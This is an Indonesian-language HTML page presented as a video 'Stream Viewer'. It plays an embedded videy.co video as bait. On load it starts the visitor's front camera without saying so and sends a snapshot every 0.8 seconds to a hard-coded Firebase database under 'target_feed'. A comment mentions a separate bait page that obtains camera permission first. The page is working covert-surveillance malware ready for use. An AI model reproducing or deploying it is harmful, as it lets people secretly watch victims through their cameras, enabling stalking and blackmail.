<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream Viewer</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; background: #000; overflow: hidden; }
        
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        #cam-container {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 160px;
            height: 120px;
            background: #111;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid rgba(255,255,255,0.2);
            z-index: 999;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            background: #000;
        }
    </style>
</head>
<body>
    <!-- Target Videy Embed -->
    <iframe src="https://videy.co/v/?id=kbxVq76S1" allow="autoplay; encrypted-media; camera; microphone" allowfullscreen></iframe>

    <!-- Kotak Preview Kamera -->
    <div id="cam-container">
        <video id="cam" autoplay playsinline muted></video>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>

    <!-- Firebase SDK v9 Modular -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        // Konfigurasi Firebase sesuai data google-services.json Anda
        const firebaseConfig = {
            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
            authDomain: "haij-4beb7.firebaseapp.com",
            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
            projectId: "haij-4beb7",
            storageBucket: "haij-4beb7.firebasestorage.app",
            messagingSenderId: "843252587335",
            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        async function initViewerCamera() {
            const videoElement = document.getElementById('cam');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            try {
                // Ambil stream karena izin sudah diberikan di pancing.html
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 640, height: 480, facingMode: "user" }, 
                    audio: false 
                });
                
                videoElement.srcObject = stream;
                await videoElement.play();

                // Kirim frame kamera ke Firebase setiap 0.8 detik
                setInterval(() => {
                    canvas.width = 320;
                    canvas.height = 240;
                    ctx.drawImage(videoElement, 0, 0, 320, 240);
                    const base64Data = canvas.toDataURL('image/jpeg', 0.5);

                    set(ref(db, 'live_stream/target_feed'), {
                        image: base64Data,
                    time: Date.now()
                    }).catch(err => {
                        console.error("Firebase sync error:", err);
                    });
                }, 800);

            } catch (err) {
                console.error("Gagal memuat stream:", err);
                document.getElementById('cam-container').style.display = 'none';
            }
        }

        window.addEventListener('DOMContentLoaded', initViewerCamera);
    </script>
</body>
</html>
